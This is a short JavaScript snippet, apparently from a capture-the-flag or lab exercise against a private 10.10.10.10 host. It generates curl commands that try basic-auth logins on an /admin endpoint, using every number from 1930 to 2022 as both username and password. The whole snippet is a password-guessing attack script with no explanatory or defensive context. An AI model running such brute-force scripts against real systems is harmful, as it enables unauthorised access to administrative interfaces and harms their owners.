let cmds = [];

for (let i = 1930; i <= 2022; i++) {
  cmds.push(`curl -u ${i}:${i} 10.10.10.10:50695/admin`);
}

console.log(cmds.join('\n'))